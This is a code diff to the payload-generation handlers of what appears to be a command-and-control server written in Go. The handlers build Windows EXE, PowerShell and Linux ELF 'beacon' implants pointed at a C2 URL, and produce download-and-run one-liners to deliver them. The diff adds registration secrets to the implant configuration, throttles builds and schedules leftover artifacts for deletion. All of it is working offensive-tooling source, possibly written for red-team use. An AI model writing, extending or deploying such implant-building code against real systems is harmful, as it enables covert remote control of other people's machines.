@@ -58,6 +58,12 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		beaconKey = s.serverBeaconKey()
 	}
 
+	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, err.Error())
+		return
+	}
+
 	cfg := payload.ImplantConfig{
 		C2URL:          form.C2URL,
 		Protocol:       form.Protocol,
@@ -74,6 +80,8 @@ func (s *Server) handleGeneratePS1(c *gin.Context) {
 		Proxy:         form.Proxy,
 		CryptoKey:     form.CryptoKey,
 		BeaconKey:     beaconKey,
+		RegSecretID:   regSecretID,
+		RegSecret:     regSecretB64,
 	}
 
 	ps1Code, err := payload.GeneratePowerShellSource(cfg, s.implantDataDir())
@@ -181,6 +189,12 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		beaconKey = s.serverBeaconKey()
 	}
 
+	regSecretID, regSecretB64, beaconKey, err := s.ensureV3RegSecret(beaconKey)
+	if err != nil {
+		respondError(c, http.StatusInternalServerError, err.Error())
+		return
+	}
+
 	cfg := payload.ImplantConfig{
 		C2URL:            form.C2URL,
 		Protocol:         form.Protocol,
@@ -202,6 +216,8 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		Proxy:         form.Proxy,
 		CryptoKey:     form.CryptoKey,
 		BeaconKey:     beaconKey,
+		RegSecretID:   regSecretID,
+		RegSecret:     regSecretB64,
 	}
 
 	agentsDir := filepath.Join(s.cfg.Server.DataDir, "agents")
@@ -221,7 +237,7 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 	)
 	switch payloadType {
 	case "exe":
-		genPath, genErr = payload.GenerateWindowsEXE(cfg, agentsDir)
+		genPath, genErr = s.withBuildSlot(func() (string, error) { return payload.GenerateWindowsEXE(cfg, agentsDir) })
 		filename = "beacon.exe"
 		format = "exe"
 	case "ps1":
@@ -229,7 +245,7 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 		filename = "beacon.ps1"
 		format = "ps1"
 	case "linux":
-		genPath, genErr = payload.GenerateLinuxELF(cfg, agentsDir)
+		genPath, genErr = s.withBuildSlot(func() (string, error) { return payload.GenerateLinuxELF(cfg, agentsDir) })
 		filename = "beacon.elf"
 		format = "elf"
 	default:
@@ -291,6 +307,12 @@ func (s *Server) handleGenerateOneLiner(c *gin.Context) {
 
 	// Generate one-liner variants
 	oneLiners := buildOneLiners(payloadType, ps1Code, payloadURL, hostPath, form.Proxy)
+
+	// The original build artifact in data/agents is a duplicate of the hosted
+	// payload copy and is never served again — register it for reaping.
+	if genPath != "" {
+		s.registerTransientArtifact(genPath)
+	}
 
 	s.logBuild(format, "oneliner", form.C2URL, form.ListenerID, filename, "success", "", hostPath)
 	c.JSON(http.StatusOK, gin.H{
